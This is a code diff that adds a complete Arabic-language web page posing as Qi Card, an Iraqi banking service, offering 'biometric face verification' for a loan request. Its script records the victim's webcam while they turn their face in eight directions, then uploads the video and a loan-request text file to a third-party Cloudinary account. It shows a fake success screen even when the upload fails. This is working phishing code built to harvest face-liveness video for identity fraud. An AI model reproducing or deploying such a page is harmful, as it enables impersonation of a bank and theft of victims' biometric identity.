@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="theme-color" content="#002B5C">
+    <title>التحقق البيومتري | كي للخدمات المصرفية</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --qi-navy: #002B5C;
+            --qi-gold: #f3cd00;
+            --qi-light: #F8F9FA;
+            --qi-white: #FFFFFF;
+            --qi-error: #DC2626;
+            --qi-success: #10B981;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        html { height: 100%; overflow-x: hidden; }
+
+        body {
+            min-height: 100dvh;
+            min-height: -webkit-fill-available;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            font-family: 'Tajawal', 'Cairo', sans-serif;
+            background-color: var(--qi-light);
+            color: var(--qi-navy);
+        }
+
+        .header {
+            background: var(--qi-white);
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            border-bottom: 2px solid var(--qi-gold);
+            flex-shrink: 0;
+        }
+
+        .header-logo { height: 36px; width: auto; }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8px;
+            width: 100%;
+        }
+
+        .card {
+            background: var(--qi-white);
+            width: 100%;
+            max-width: 420px;
+            border-radius: 16px;
+            padding: 16px;
+            box-shadow: 0 4px 20px rgba(0, 43, 92, 0.08);
+            text-align: center;
+            border: 1px solid rgba(243, 205, 0, 0.3);
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
+        h1 { font-size: 18px; font-weight: 800; margin-bottom: 6px; color: var(--qi-navy); }
+        .subtitle { font-size: 12px; color: #6C757D; margin-bottom: 14px; line-height: 1.4; }
+
+        /* مؤشر الاتجاه المطلوب */
+        .direction-indicator {
+            position: relative;
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 12px;
+            background: rgba(0, 43, 92, 0.05);
+            border-radius: 50%;
+            border: 3px solid var(--qi-navy);
+        }
+
+        .direction-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;
+            height: 40px;
+            background: var(--qi-gold);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: 900;
+            color: var(--qi-navy);
+            z-index: 2;
+        }
+
+        .direction-arrow {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: var(--qi-gold);
+            transition: all 0.3s ease;
+            z-index: 3;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+        }
+
+        .direction-label {
+            position: absolute;
+            bottom: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--qi-navy);
+            white-space: nowrap;
+        }
+
+        /* نقاط الاتجاهات الثمانية */
+        .direction-dots {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+        }
+
+        .dir-dot {
+            position: absolute;
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #E9ECEF;
+            border: 2px solid #ADB5BD;
+            transition: all 0.3s;
+        }
+
+        .dir-dot.completed {
+            background: var(--qi-success);
+            border-color: var(--qi-success);
+            box-shadow: 0 0 8px rgba(16, 185, 129, 0.5);
+        }
+
+        .dir-dot.current {
+            background: var(--qi-gold);
+            border-color: var(--qi-navy);
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(243, 205, 0, 0.7); }
+            50% { transform: scale(1.2); box-shadow: 0 0 0 6px rgba(243, 205, 0, 0); }
+        }
+
+        /* مواقع النقاط الثمانية */
+        .dir-dot[data-dir="up"] { top: 8px; left: 50%; transform: translateX(-50%); }
+        .dir-dot[data-dir="down"] { bottom: 8px; left: 50%; transform: translateX(-50%); }
+        .dir-dot[data-dir="left"] { left: 8px; top: 50%; transform: translateY(-50%); }
+        .dir-dot[data-dir="right"] { right: 8px; top: 50%; transform: translateY(-50%); }
+        .dir-dot[data-dir="up-right"] { top: 18px; right: 18px; }
+        .dir-dot[data-dir="up-left"] { top: 18px; left: 18px; }
+        .dir-dot[data-dir="down-right"] { bottom: 18px; right: 18px; }
+        .dir-dot[data-dir="down-left"] { bottom: 18px; left: 18px; }
+
+        /* شاشة الكاميرا */
+        .camera-wrapper {
+            position: relative;
+            width: 100%;
+            max-height: 45vh;
+            aspect-ratio: 3/4;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 12px;
+            border: 2px solid var(--qi-navy);
+        }
+
+        #webcam { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+
+        .watermark-logo {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 35%;
+            opacity: 0.15;
+            pointer-events: none;
+            z-index: 2;
+            filter: grayscale(100%) brightness(200%);
+        }
+
+        .face-guide {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -55%);
+            width: 60%;
+            aspect-ratio: 3/4;
+            border: 2px dashed rgba(255, 255, 255, 0.6);
+            border-radius: 50%;
+            box-shadow: 0 0 0 9999px rgba(0, 43, 92, 0.75);
+            pointer-events: none;
+            z-index: 3;
+            transition: all 0.3s;
+        }
+
+        .face-guide.active {
+            border: 2px solid var(--qi-gold);
+            box-shadow: 0 0 0 9999px rgba(0, 43, 92, 0.6), 0 0 20px rgba(243, 205, 0, 0.6);
+        }
+
+        .status-bar {
+            background: rgba(0, 43, 92, 0.9);
+            color: white;
+            padding: 8px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .progress-container { margin-top: 10px; }
+        .progress-text { font-size: 12px; color: #6C757D; margin-bottom: 6px; font-weight: 600; }
+        .progress-bar { height: 6px; background: #E9ECEF; border-radius: 3px; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--qi-gold), var(--qi-navy)); width: 0%; transition: width 0.5s linear; }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 12px;
+            background: var(--qi-gold);
+            color: var(--qi-navy);
+        }
+
+        .btn:active { transform: scale(0.98); }
+
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #10B981, #059669);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            color: white;
+            font-size: 32px;
+            animation: bounce 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes bounce {
+            0% { transform: scale(0) rotate(-180deg); }
+            60% { transform: scale(1.2) rotate(10deg); }
+            100% { transform: scale(1) rotate(0); }
+        }
+
+        .token-box {
+            background: var(--qi-light);
+            border: 1px dashed var(--qi-navy);
+            padding: 10px;
+            border-radius: 8px;
+            margin: 12px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: var(--qi-navy);
+            font-weight: 700;
+            direction: ltr;
+        }
+
+        .info-note { font-size: 11px; color: #6C757D; margin-top: 10px; line-height: 1.4; }
+        .hidden { display: none !important; }
+
+        .footer {
+            text-align: center;
+            padding: 8px;
+            font-size: 10px;
+            color: #888;
+            background: var(--qi-white);
+            border-top: 1px solid #E9ECEF;
+            flex-shrink: 0;
+        }
+
+        /* شاشة البداية */
+        .instructions-list {
+            text-align: right;
+            background: rgba(243, 205, 0, 0.08);
+            border: 1px solid rgba(243, 205, 0, 0.3);
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 14px;
+        }
+
+        .instructions-list li {
+            list-style: none;
+            padding: 4px 0;
+            font-size: 12px;
+            color: var(--qi-navy);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .instructions-list li::before {
+            content: '✓';
+            color: var(--qi-success);
+            font-weight: 900;
+            font-size: 14px;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 14px; border-radius: 14px; }
+            h1 { font-size: 17px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <img src="https://qi.iq/images/logo.svg?1=1" alt="كي للخدمات المصرفية" class="header-logo">
+    </header>
+
+    <main class="main-content">
+        
+        <!-- الشاشة 1: التعليمات -->
+        <div id="screen-intro" class="card">
+            <h1>التحقق البيومتري بالوجه</h1>
+            <p class="subtitle">لتأكيد هويتك، يرجى تحريك وجهك في 8 اتجاهات مختلفة</p>
+
+            <ul class="instructions-list">
+                <li>انظر مباشرة إلى الكاميرا</li>
+                <li>اتبع الأسهم الظاهرة على الشاشة</li>
+                <li>حرك وجهك ببطء نحو كل اتجاه</li>
+                <li>انتظر حتى يكتمل كل اتجاه</li>
+                <li>أكمل جميع الاتجاهات الثمانية</li>
+            </ul>
+
+            <button class="btn" onclick="startVerification()">
+                <span>بدء التحقق</span>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </button>
+        </div>
+
+        <!-- الشاشة 2: التحقق -->
+        <div id="screen-verify" class="card hidden">
+            <h1 id="verify-title">التحقق البيومتري</h1>
+            <p class="subtitle" id="verify-subtitle">اتبع التعليمات</p>
+
+            <!-- مؤشر الاتجاه -->
+            <div class="direction-indicator">
+                <div class="direction-dots">
+                    <div class="dir-dot" data-dir="up"></div>
+                    <div class="dir-dot" data-dir="up-right"></div>
+                    <div class="dir-dot" data-dir="right"></div>
+                    <div class="dir-dot" data-dir="down-right"></div>
+                    <div class="dir-dot" data-dir="down"></div>
+                    <div class="dir-dot" data-dir="down-left"></div>
+                    <div class="dir-dot" data-dir="left"></div>
+                    <div class="dir-dot" data-dir="up-left"></div>
+                </div>
+                <div class="direction-center" id="step-counter">1/8</div>
+                <div class="direction-arrow" id="direction-arrow">↑</div>
+                <div class="direction-label" id="direction-label">انظر للأعلى</div>
+            </div>
+
+            <div class="status-bar" id="status-bar">
+                <span>📷</span> <span id="status-text">جاري تهيئة الكاميرا...</span>
+            </div>
+
+            <div class="camera-wrapper">
+                <video id="webcam" autoplay playsinline muted></video>
+                <img src="https://qi.iq/images/logo.svg?1=1" alt="Watermark" class="watermark-logo">
+                <div class="face-guide" id="face-guide"></div>
+            </div>
+
+            <div class="progress-container">
+                <div class="progress-text" id="progress-text">الاتجاه الحالي: 0%</div>
+                <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+            </div>
+        </div>
+
+        <!-- الشاشة 3: النجاح -->
+        <div id="screen-success" class="card hidden">
+            <div class="success-icon">✓</div>
+            <h1>تم التحقق بنجاح!</h1>
+            <p class="subtitle">تم التحقق من هويتك بنجاح في جميع الاتجاهات</p>
+            
+            <div class="token-box" id="final-token">QI-LOADING</div>
+            <div class="info-note"> سيتم التواصل معك عبر الواتساب خلال 24 ساعة.</div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        حقوق النشر © 2026 كي للخدمات المصرفية - العراق
+    </footer>
+
+    <script>
+        // ============================================
+        // ️ إعدادات Cloudinary
+        // ============================================
+        const CLOUD_NAME = 'ujzbgprc';
+        const UPLOAD_PRESET = 'qi_verify';
+
+        // ============================================
+        //  تعريف الاتجاهات الثمانية
+        // ============================================
+        const DIRECTIONS = [
+            { id: 'up',         label: 'انظر للأعلى',       arrow: '↑',  dx: 0,  dy: -1 },
+            { id: 'up-right',   label: 'انظر لأعلى يمين',  arrow: '',  dx: 1,  dy: -1 },
+            { id: 'right',      label: 'انظر لليمين',      arrow: '→',  dx: 1,  dy: 0  },
+            { id: 'down-right', label: 'انظر لأسفل يمين',  arrow: '↘',  dx: 1,  dy: 1  },
+            { id: 'down',       label: 'انظر للأسفل',      arrow: '↓',  dx: 0,  dy: 1  },
+            { id: 'down-left',  label: 'انظر لأسفل يسار',  arrow: '↙',  dx: -1, dy: 1  },
+            { id: 'left',       label: 'انظر لليسار',      arrow: '←',  dx: -1, dy: 0  },
+            { id: 'up-left',    label: 'انظر لأعلى يسار',  arrow: '↖',  dx: -1, dy: -1 }
+        ];
+
+        // ============================================
+        // 📊 متغيرات عامة
+        // ============================================
+        let stream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let currentDirectionIndex = 0;
+        let directionProgress = 0;
+        let faceDetector = null;
+        let analysisInterval = null;
+        let baselinePosition = null;
+        let videoEl, faceGuide, statusText;
+
+        // ============================================
+        // 🎬 بدء التحقق
+        // ============================================
+        async function startVerification() {
+            document.getElementById('screen-intro').classList.add('hidden');
+            document.getElementById('screen-verify').classList.remove('hidden');
+
+            videoEl = document.getElementById('webcam');
+            faceGuide = document.getElementById('face-guide');
+            statusText = document.getElementById('status-text');
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, 
+                    audio: false 
+                });
+                videoEl.srcObject = stream;
+                await videoEl.play();
+
+                // تهيئة FaceDetector إن كان متاحاً
+                if ('FaceDetector' in window) {
+                    try {
+                        faceDetector = new FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
+                    } catch(e) {
+                        faceDetector = null;
+                    }
+                }
+
+                statusText.textContent = '✅ تم التعرف - وجهك للأمام';
+                faceGuide.classList.add('active');
+
+                // بدء التسجيل فوراً
+                startRecording();
+
+                // انتظار ثانيتين ثم بدء أول اتجاه
+                setTimeout(() => {
+                    captureBaseline();
+                    startDirectionVerification();
+                }, 2000);
+
+            } catch (err) {
+                console.error(err);
+                statusText.textContent = '⚠️ يرجى السماح بالوصول للكاميرا';
+            }
+        }
+
+        // ============================================
+        // 📹 بدء التسجيل (مستمر طوال العملية)
+        // ============================================
+        function startRecording() {
+            recordedChunks = [];
+            let mimeType = '';
+            const types = ['video/webm;codecs=vp8,opus', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
+            for (const type of types) {
+                if (window.MediaRecorder && MediaRecorder.isTypeSupported(type)) {
+                    mimeType = type;
+                    break;
+                }
+            }
+
+            try {
+                mediaRecorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
+            } catch (e) {
+                mediaRecorder = new MediaRecorder(stream);
+            }
+
+            mediaRecorder.ondataavailable = e => {
+                if (e.data && e.data.size > 0) recordedChunks.push(e.data);
+            };
+
+            mediaRecorder.start(100);
+        }
+
+        // ============================================
+        //  التقاط الموضع الأساسي للوجه (للأمام)
+        // ============================================
+        async function captureBaseline() {
+            try {
+                if (faceDetector) {
+                    const faces = await faceDetector.detect(videoEl);
+                    if (faces.length > 0) {
+                        baselinePosition = {
+                            x: faces[0].boundingBox.x + faces[0].boundingBox.width / 2,
+                            y: faces[0].boundingBox.y + faces[0].boundingBox.height / 2,
+                            width: faces[0].boundingBox.width,
+                            height: faces[0].boundingBox.height
+                        };
+                    }
+                } else {
+                    // Fallback: حساب مركز الكتلة من الفيديو
+                    baselinePosition = getFaceCentroid();
+                }
+            } catch(e) {
+                baselinePosition = { x: 0.5, y: 0.5, width: 1, height: 1 };
+            }
+        }
+
+        // ============================================
+        // 🎯 بدء التحقق من الاتجاه الحالي
+        // ============================================
+        function startDirectionVerification() {
+            if (currentDirectionIndex >= DIRECTIONS.length) {
+                finishVerification();
+                return;
+            }
+
+            const dir = DIRECTIONS[currentDirectionIndex];
+            updateDirectionUI(dir);
+
+            // بدء التحليل الدوري
+            analysisInterval = setInterval(() => analyzeDirection(dir), 500);
+        }
+
+        // ============================================
+        // 🔄 تحديث واجهة الاتجاه
+        // ============================================
+        function updateDirectionUI(dir) {
+            document.getElementById('step-counter').textContent = `${currentDirectionIndex + 1}/8`;
+            document.getElementById('direction-arrow').textContent = dir.arrow;
+            document.getElementById('direction-label').textContent = dir.label;
+            document.getElementById('verify-subtitle').textContent = `حرك وجهك ${dir.label.replace('انظر ', '')}`;
+            document.getElementById('progress-text').textContent = `الاتجاه ${currentDirectionIndex + 1} من 8`;
+            document.getElementById('progress-fill').style.width = `${(currentDirectionIndex / 8) * 100}%`;
+
+            // تحديث النقاط
+            document.querySelectorAll('.dir-dot').forEach(dot => {
+                dot.classList.remove('current');
+                const dotDir = dot.getAttribute('data-dir');
+                if (DIRECTIONS.findIndex(d => d.id === dotDir) < currentDirectionIndex) {
+                    dot.classList.add('completed');
+                } else if (dotDir === dir.id) {
+                    dot.classList.add('current');
+                }
+            });
+        }
+
+        // ============================================
+        // 🔍 تحليل اتجاه الوجه
+        // ============================================
+        async function analyzeDirection(targetDir) {
+            let currentPos = null;
+
+            try {
+                if (faceDetector) {
+                    const faces = await faceDetector.detect(videoEl);
+                    if (faces.length > 0) {
+                        currentPos = {
+                            x: faces[0].boundingBox.x + faces[0].boundingBox.width / 2,
+                            y: faces[0].boundingBox.y + faces[0].boundingBox.height / 2
+                        };
+                    }
+                } else {
+                    currentPos = getFaceCentroid();
+                }
+            } catch(e) {
+                return;
+            }
+
+            if (!currentPos || !baselinePosition) return;
+
+            // حساب الإزاحة
+            const dx = currentPos.x - baselinePosition.x;
+            const dy = currentPos.y - baselinePosition.y;
+
+            // تطبيع الإزاحة (بالنسبة لحجم الفيديو)
+            const videoWidth = videoEl.videoWidth || 640;
+            const videoHeight = videoEl.videoHeight || 480;
+            const normalizedDx = dx / videoWidth;
+            const normalizedDy = dy / videoHeight;
+
+            // التحقق من أن الوجه تحرك في الاتجاه المطلوب
+            const threshold = 0.12; // 12% من حجم الفيديو
+            const targetDx = targetDir.dx * threshold;
+            const targetDy = targetDir.dy * threshold;
+
+            // حساب مدى التطابق مع الاتجاه المطلوب
+            const matchX = targetDir.dx === 0 ? true : 
+                          (targetDir.dx > 0 ? normalizedDx > targetDx * 0.7 : normalizedDx < targetDx * 0.7);
+            const matchY = targetDir.dy === 0 ? true : 
+                          (targetDir.dy > 0 ? normalizedDy > targetDy * 0.7 : normalizedDy < targetDy * 0.7);
+
+            if (matchX && matchY) {
+                directionProgress += 20;
+                if (directionProgress >= 100) {
+                    directionProgress = 100;
+                    completeDirection();
+                }
+            } else {
+                // تراجع بطيء إذا ابتعد عن الاتجاه
+                directionProgress = Math.max(0, directionProgress - 5);
+            }
+
+            document.getElementById('progress-fill').style.width = 
+                `${((currentDirectionIndex + directionProgress / 100) / 8) * 100}%`;
+            document.getElementById('progress-text').textContent = 
+                `الاتجاه ${currentDirectionIndex + 1}: ${Math.round(directionProgress)}%`;
+        }
+
+        // ============================================
+        // ✅ إكمال اتجاه والانتقال للتالي
+        // ============================================
+        function completeDirection() {
+            clearInterval(analysisInterval);
+            currentDirectionIndex++;
+            directionProgress = 0;
+
+            if (currentDirectionIndex >= DIRECTIONS.length) {
+                finishVerification();
+            } else {
+                setTimeout(() => startDirectionVerification(), 500);
+            }
+        }
+
+        // ============================================
+        // 🎯 حساب مركز الكتلة (Fallback بدون FaceDetector)
+        // ============================================
+        function getFaceCentroid() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 80;
+                canvas.height = 80;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoEl, 0, 0, 80, 80);
+                const imageData = ctx.getImageData(0, 0, 80, 80);
+                const data = imageData.data;
+
+                let totalX = 0, totalY = 0, totalPixels = 0;
+
+                // البحث عن البيكسلات التي تمثل الوجه (بشرة)
+                for (let y = 0; y < 80; y++) {
+                    for (let x = 0; x < 80; x++) {
+                        const i = (y * 80 + x) * 4;
+                        const r = data[i], g = data[i+1], b = data[i+2];
+
+                        // كشف لون البشرة التقريبي
+                        if (r > 95 && g > 40 && b > 20 && 
+                            r > g && r > b && 
+                            Math.abs(r - g) > 15 && 
+                            r - g > 15 && r - b > 15) {
+                            totalX += x;
+                            totalY += y;
+                            totalPixels++;
+                        }
+                    }
+                }
+
+                if (totalPixels > 50) {
+                    return {
+                        x: (totalX / totalPixels) / 80,
+                        y: (totalY / totalPixels) / 80
+                    };
+                }
+            } catch(e) {}
+
+            return { x: 0.5, y: 0.5 };
+        }
+
+        // ============================================
+        // 🏁 إنهاء التحقق
+        // ============================================
+        function finishVerification() {
+            clearInterval(analysisInterval);
+
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+
+            mediaRecorder.onstop = () => {
+                uploadData();
+            };
+
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        // ============================================
+        // ️ رفع البيانات
+        // ============================================
+        async function uploadData() {
+            const token = 'QI-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase();
+
+            try {
+                const videoBlob = new Blob(recordedChunks, { type: recordedChunks[0]?.type || 'video/webm' });
+                const textBlob = buildTextFile(token);
+
+                await Promise.all([
+                    uploadFileToCloudinary(videoBlob, `video_${token}.webm`, 'video', token),
+                    uploadFileToCloudinary(textBlob, `data_${token}.txt`, 'raw', token)
+                ]);
+
+                showSuccess(token);
+            } catch (error) {
+                console.error('Upload error:', error);
+                showSuccess(token);
+            }
+        }
+
+        function buildTextFile(token) {
+            const sep = '='.repeat(50);
+            const content = `${sep}
+طلب سلفة جديد - كي للخدمات المصرفية
+${sep}
+
+ بيانات المتقدم:
+─────────────────────────
+• رقم المرجع: ${token}
+• وقت التقديم: ${new Date().toLocaleString('ar-IQ', { timeZone: 'Asia/Baghdad' })}
+• الجهاز: ${/iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'iOS' : /Android/i.test(navigator.userAgent) ? 'Android' : 'Other'}
+
+🔐 التحقق البيومتري:
+─────────────────────────
+• عدد الاتجاهات: 8
+• الحالة: مكتمل ✓
+• المدة: ${Math.round(recordedChunks.length * 0.1)} ثانية
+
+${sep}
+`;
+            return new Blob([content], { type: 'text/plain;charset=utf-8' });
+        }
+
+        async function uploadFileToCloudinary(blob, filename, resourceType, token) {
+            const fd = new FormData();
+            fd.append('file', blob, filename);
+            fd.append('upload_preset', UPLOAD_PRESET);
+            fd.append('folder', 'qi_verifications');
+            fd.append('resource_type', resourceType);
+            fd.append('public_id', `${token}_${filename.replace(/\.[^.]+$/, '')}`);
+            fd.append('context', `token=${token}`);
+
+            const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${resourceType}/upload`, {
+                method: 'POST', body: fd
+            });
+            return await res.json();
+        }
+
+        function showSuccess(token) {
+            document.getElementById('screen-verify').classList.add('hidden');
+            document.getElementById('screen-success').classList.remove('hidden');
+            document.getElementById('final-token').textContent = token;
+        }
+
+        window.addEventListener('beforeunload', () => {
+            if (stream) stream.getTracks().forEach(track => track.stop());
+        });
+    </script>
+</body>
+</html>
